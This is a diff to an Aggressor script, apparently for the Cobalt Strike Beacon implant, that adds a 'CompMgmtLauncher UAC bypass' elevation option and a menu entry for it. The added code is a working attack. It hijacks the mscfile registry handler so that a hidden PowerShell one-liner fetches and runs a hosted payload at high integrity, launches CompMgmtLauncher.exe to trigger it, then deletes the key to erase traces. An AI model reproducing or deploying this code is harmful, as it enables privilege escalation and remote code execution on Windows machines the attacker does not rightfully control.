@@ -142,6 +142,28 @@ sub ms16_016_exploit {
 
 beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
 
+sub compMgmtLauncher_exploit {
+    btask($1, "Task Beacon to run " . listener_describe($2) . " in a high-integrity context.");
+
+    $script = artifact($2, "powershell");
+
+    $oneliner = beacon_host_script($1, $script);
+    $oneliner = strrep($oneliner, "IEX ", "");
+
+    $cmd = "reg add HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command /d \"";
+    $cmd .= "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden iex -c " . $oneliner . "\" /f";
+
+    bshell($1, $cmd);
+
+    bcd($1, "C:\\Windows\\System32");
+
+    bpowerpick($1, ".\\CompMgmtLauncher.exe");
+
+    bshell($1, "reg delete HKEY_CURRENT_USER\\Software\\Classes\\mscfile /f");
+}
+
+beacon_exploit_register("compmgmt", "CompMgmtLauncher UAC bypass", &compMgmtLauncher_exploit);
+
 # Add these menu items to the bottom of the Beacon menu
 popup beacon_bottom {
     # Add submenu for Elevate options
@@ -163,6 +185,12 @@ popup beacon_bottom {
         item "MS16-032" {
             openPayloadHelper(lambda({
                 ms16_032_exploit($bid, $1);
+                                     }, $bid => $1));
+        }
+
+        item "CompMgmt" {
+            openPayloadHelper(lambda({
+                compMgmtLauncher_exploit($bid, $1);
                                      }, $bid => $1));
         }
 
